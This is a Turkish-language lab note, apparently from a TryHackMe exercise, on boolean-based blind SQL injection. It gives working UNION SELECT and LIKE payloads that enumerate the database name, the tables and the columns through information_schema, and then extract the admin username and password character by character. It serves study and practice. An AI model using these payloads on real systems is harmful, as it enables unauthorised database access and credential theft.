#Boolean Based

Boole tabanlı SQL Enjeksiyonu, enjeksiyon girişimlerimizden aldığımız yanıta atıfta bulunur; bu yanıt doğru/yanlış, evet/hayır, açık/kapalı, 1/0 veya yalnızca iki sonucu olabilen herhangi bir yanıt olabilir. Bu sonuç, SQL Enjeksiyon yükümüzün başarılı olup olmadığını doğrular. İlk incelemede, bu sınırlı yanıtın fazla bilgi sağlayamayacağını düşünebilirsiniz. Yine de, yalnızca bu iki yanıtla, tüm bir veritabanı yapısını ve içeriklerini sıralamak mümkündür.

#Practica

```bash
https://website.thm/checkuser?username=admin
```

Web uygulaması false olarak alınan değerle yanıt verdiğinden   , bunun sütunların yanlış değeri olduğunu doğrulayabiliriz.  true alınan bir  değere  sahip olana kadar daha fazla sütun eklemeye devam edin . Kullanıcı adını aşağıdaki değere ayarlayarak cevabın üç sütun olduğunu doğrulayabilirsiniz:


```bash
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3;-- 
```

Artık sütun sayımız belirlendiğine göre, veritabanının numaralandırılması üzerinde çalışabiliriz. İlk görevimiz veritabanı adını keşfetmektir. Bunu, yerleşik  database()  metodunu kullanarak ve ardından  like  operatörünü kullanarak doğru bir durum döndürecek sonuçları bulmaya çalışarak yapabiliriz.
Aşağıdaki kullanıcı adı değerini deneyin ve ne olacağını görün:

 % işaretinin başına harfleri getiricez db_name cıkartana kadar eğer her doğru harf için true değeri gelicek.
 
 
```bash
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 's%';-- // true
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 'sq%';-- //true

// taaki bu sonuca yada db_namee erişene kadar sqli_three bunu script ilede yapabiliriz

```
 Şimdi  veritabanı adının bir sonraki karakterine, örneğin 'sa%', 'sb%', 'sc%', vb. gibi başka bir doğru yanıt bulana kadar geçin. Veritabanı adının tüm karakterlerini, yani  sqli_three'yi keşfedene kadar bu işlemi sürdürün .



Artık benzer bir yöntem kullanarak tablo adlarını numaralandırmak için kullanabileceğimiz veritabanı adını oluşturduk. Kullanıcı adını aşağıdaki değere ayarlamayı deneyin:

```bash
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'u%';--  // true
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'us%';--  // true
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'users%';--  // true
```
Son olarak, şimdi kullanıcı tablosundaki sütun adlarını numaralandırmamız gerekiyor,   böylece oturum açma kimlik bilgilerini düzgün bir şekilde arayabiliriz. Tekrar, information_schema veritabanını ve daha önce elde ettiğimiz bilgileri kullanarak sütun adlarını sorgulayabiliriz. Aşağıdaki yükü kullanarak,   veritabanının sqli_three'ye eşit olduğu, tablo adının users olduğu ve sütun adının a harfiyle başladığı sütunlar tablosunu ararız.
```bash
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';

```
bu kısımda birden fazla kolumn olaabilir örn = password, users etc.

Bu işlemi üç kez tekrarlamak, sütunların id, username ve password'ünü keşfetmenizi sağlayacaktır. Bunu şimdi kullanıcı tablosunda oturum açma kimlik bilgilerini sorgulamak için kullanabilirsiniz   . İlk olarak, aşağıdaki yükü kullanabileceğiniz geçerli bir kullanıcı adı keşfetmeniz gerekir:

user ve password bulduk

```bash
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username like 'a%' ;--
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username like 'ad%' ;--
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username like 'admin%' ;--
```
users içinden admin userini bulduk
```bash
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'somethink%' ;--
```
bu şekilde username and password bulundu.









